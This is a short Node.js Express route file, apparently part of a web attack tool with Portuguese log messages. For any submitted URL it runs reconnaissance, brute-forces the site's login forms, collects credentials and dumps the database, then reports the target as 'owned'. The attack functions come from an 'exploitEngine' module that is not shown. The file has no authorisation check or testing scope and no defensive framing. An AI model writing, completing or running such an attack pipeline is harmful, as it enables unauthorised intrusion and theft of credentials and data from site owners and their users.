const router = require('express').Router();
const { recon, brute, dump } = require('../lib/exploitEngine');

router.post('/', async (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL obrigatória' });

  try {
    global.socket.emit('log', '[*] Iniciando recon...');
    const info = await recon(url);
    global.socket.emit('log', `[+] Tech detectada: ${info.tech}`);

    global.socket.emit('log', '[*] Força bruta em forms...');
    const creds = await brute(url, info);
    global.socket.emit('log', `[+] ${creds.length} creds capturadas`);

    global.socket.emit('log', '[*] Dumpando banco...');
    const data = await dump(url, creds);
    res.json({ status: 'owned', ...data });
  } catch (e) {
    global.socket.emit('log', `[-] Erro: ${e.message}`);
    res.json({ status: 'fail', error: e.message });
  }
});
module.exports = router;
